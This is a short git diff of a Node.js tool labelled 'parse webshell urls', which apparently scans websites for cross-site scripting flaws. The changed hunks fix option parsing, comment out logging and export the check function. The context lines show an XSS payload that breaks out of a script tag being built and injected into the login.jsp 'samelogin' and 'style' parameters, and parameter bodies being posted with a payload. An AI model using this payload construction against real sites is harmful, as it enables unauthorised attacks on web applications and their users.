@@ -41,7 +41,7 @@ program.version("parse webshell urls 1.0")
 			})
             .parse(process.argv);
 mylen = program.len || mylen;
-var g_bSkip = program.skip || true;
+var g_bSkip = "true" == program.skip;
 // 获取一个包装后的请求对象，包含设置代理后的
 	// 优先使用系统环境变量中的代理，如果设置了，则覆盖系统代理
 function fnGetRequest(req,opt)
@@ -93,7 +93,7 @@ function fnDoReq(req,opt,fnCbk)
 	}
 	
 	var xxUrl = o.uri;delete o.uri;
-	console.log(o);
+	// console.log(o);
 	req(xxUrl,o,function(e,r,b)
 	{
 		//console.log(b);
@@ -145,6 +145,7 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 					if(0 < aP.length)
 					{
 						aP.push("")
+						// encodeURIComponent
 						myXss = aP.join("=" + (s) + "&");
 						// console.log(myXss);
 						fnDoReq(req,{uri:szOurl,body:myXss},function(b1)
@@ -176,7 +177,7 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	// encodeURIComponent
 	var sxPay = ("null\";</" + g_ScrIpt + ">" + s);
 	url = aH + url + "/login.jsp?samelogin=" + sxPay + "&style=" + sxPay;
-	console.log(url)
+	//console.log(url)
 	fnDoReq(req,{uri:url},function(b,headers)
 	{
 		if(b)
@@ -202,3 +203,5 @@ if(program.url)
 		}
 	})	
 }
+
+module.exports={fnDoCheckUrl:fnDoCheckUrl};
